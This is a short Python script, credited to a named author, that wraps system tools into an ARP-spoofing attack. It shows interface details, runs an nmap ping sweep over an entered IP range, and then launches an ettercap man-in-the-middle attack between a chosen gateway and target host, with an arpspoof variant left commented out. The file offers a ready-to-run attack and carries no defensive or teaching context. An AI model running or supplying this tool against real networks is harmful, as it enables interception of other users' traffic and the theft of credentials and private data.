import subprocess

def info():
    print(r"""
        ____  _______    ________       __  ______  __________
       / __ \/ ____/ |  / /  _/ /       \ \/ / __ \/ ____/  _/
      / / / / __/  | | / // // /         \  / / / / / __ / /
     / /_/ / /___  | |/ // // /___       / / /_/ / /_/ // /
    /_____/_____/  |___/___/_____/      /_/\____/\____/___/
    """)
    print(r" -----------------------------------------------")
    print(r'| * Syntax: "sudo python3 ARP.py"               |')
    print(r"| * This code performs ARP spoofing attack      |")
    print(r"| * Recommended for Kali Linux                  |")
    print(r"| * Author: Ygendra R Bijapur                   |")
    print(r" -----------------------------------------------")

def ip():
    subprocess.run(["ifconfig"])


def nmap():
    ip = input("\nEnter IP Range,\nEg:198.172.14.50-200  ==> ")
    subprocess.run(["route", "-n"])
    subprocess.run(["nmap", "-sP", ip])


def ARP_spoofing():
    t1 = input("\nEnter gateway IP from above list:")
    t2 = input("\nEnter target IP from above list:")
    ani = input("\nEnter active network interfaces,\nEg: eth0,wlan0,l0,etc  ==> ")
    subprocess.run(["ettercap", "-T", "-S", "-i", ani, "-M", "arp:remote", "/"+t1+"//", "/"+t2+"//"])
    #subprocess.run(["arpspoof", "-i", ani, "-t", t1, t2])

info()
ip()
nmap()
ARP_spoofing()

